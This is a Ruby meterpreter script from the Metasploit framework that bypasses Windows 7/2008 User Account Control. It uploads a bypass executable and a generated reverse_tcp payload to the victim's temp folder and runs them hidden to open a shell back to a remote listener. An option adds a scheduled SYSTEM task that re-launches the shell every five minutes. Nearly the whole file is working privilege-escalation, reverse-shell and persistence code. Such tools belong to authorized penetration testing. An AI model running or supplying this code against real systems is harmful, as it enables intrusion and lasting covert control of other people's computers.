# $Id: bypassuac.rb 10823 2010-10-26 00:32:50Z rel1k $
# $Revision: 10823 $
# Author: mitnick and rel1k
# Uses a meterpreter session to upload a uac bypass executable and spawn a new meterpreter
# shell with the uac bypass running as system. This works on Windows 7/2008 x32/x64 bit 
# systems.
#

#
# Options
#

opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,   "This help menu. Spawn a meterpreter shell without UAC restrictions."],
	"-r"  => [ true,    "The IP of a remote Metasploit listening for the connect back"],
	"-p"  => [ true,    "The port on the remote host where Metasploit is listening (default: 4546)"],
	"-s"  => [ false,   "This will spawn a meterpreter shell once under the UAC bypass method"],
	"-t"  => [ false,   "Schedule a task running as system that will spawn meterpreter every 5 minutes"],
	"-k"  => [ true,    "Kill all tasks that have been scheduled. Note you must specify service name to kill. Ex: run bypassuac -k <servicename>"]
)

#
# Default parameters
#
filename= Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
tempexe_name = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
random_service = Rex::Text.rand_text_alpha((rand(8)+6))

rhost    = Rex::Socket.source_address("1.2.3.4")
rport    = 4546
lhost    = "127.0.0.1"
pay      = nil
cmd = nil
counter = 0
processid = nil
kill_task = nil
bitcounter = nil
platform=nil

info = "\nMetasploit Bypass UAC Plugin\n\nThis module exploits a weakness identified in 2009 Leo Davidson that exploits a flaw within a process injection technique into applications that are signed with the Windows Publisher certificate which does not require UAC."

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		print_line(info)
		print_line(opts.usage)
		raise Rex::Script::Completed

	when "-r"
		rhost = val
	when "-p"
		rport = val.to_i

	when "-t"
		counter = 1

	when "-k"
		processid = val
		counter = 2
	end

end

if counter != 2
	print_status("Creating a reverse meterpreter stager: LHOST=#{rhost} LPORT=#{rport}")
	payload = "windows/meterpreter/reverse_tcp"
	pay = client.framework.payloads.create(payload)
	pay.datastore['LHOST'] = rhost
	pay.datastore['LPORT'] = rport
	mul = client.framework.exploits.create("multi/handler")
	mul.share_datastore(pay.datastore)
	mul.datastore['WORKSPACE'] = client.workspace
	mul.datastore['PAYLOAD'] = payload
	mul.datastore['EXITFUNC'] = 'process'
	mul.datastore['ExitOnSession'] = true
	print_status("Running payload handler")
	mul.exploit_simple(
		'Payload'  => mul.datastore['PAYLOAD'],
		'RunAsJob' => true
	)
	
end

if client.platform =~ /win32|win64/

	server = client.sys.process.open
	tempdir = client.fs.file.expand_path("%TEMP%")
	systemroot = client.fs.file.expand_path("%SYSTEMROOT%")
	if counter == 0
		cmd = "#{tempdir}\\#{filename} /c %TEMP%\\"+"#{tempexe_name}"
	end
	if counter == 1
		cmd = "#{tempdir}\\#{filename} /c schtasks /create /ru SYSTEM /sc minute /mo 5 /tn #{random_service} /tr %TEMP%\\#{tempexe_name}"
	end
	
	if counter != 2
		print_status("Uploading Windows UACBypass to victim machine.")
		path = File.join(Msf::Config.install_root, "data", "exploits", "uac")
		session.fs.file.upload_file("%TEMP%\\#{filename}","#{path}/" + "bypassuac.exe")
		print_status("Bypassing UAC Restrictions on the system....")
		raw = pay.generate
		exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
		print_status("Meterpreter stager executable #{exe.length} bytes long")
		#
		# Upload to the filesystem
		#
		tempexe = tempdir + "\\" + tempexe_name
		tempexe.gsub!("\\\\", "\\")
		fd = client.fs.file.new(tempexe, "wb")
		fd.write(exe)
		fd.close
		print_status("Uploaded the agent to the filesystem....")
		#
		# Execute the agent
		#
		execute_payload = cmd
		#execute_payload.gsub!("\\\\", "\\")

		if counter == 1
			print_status("Creating a service to spawn every 5 minutes under servicename #{random_service}")
		end
		print_status("Executing the agent with endpoint #{rhost}:#{rport} with UACBypass in effect...")
		print_status(execute_payload)
		pid = session.sys.process.execute(execute_payload, nil, {'Hidden' => true})
	end

	# if we specified kill the service
	if counter == 2
		kill_task = "schtasks /F /delete /tn" + val
		print_status("Killing process specified: "+ processid)
		pid = session.sys.process.execute(kill_task, nil, {'Hidden' => true})
	end
end
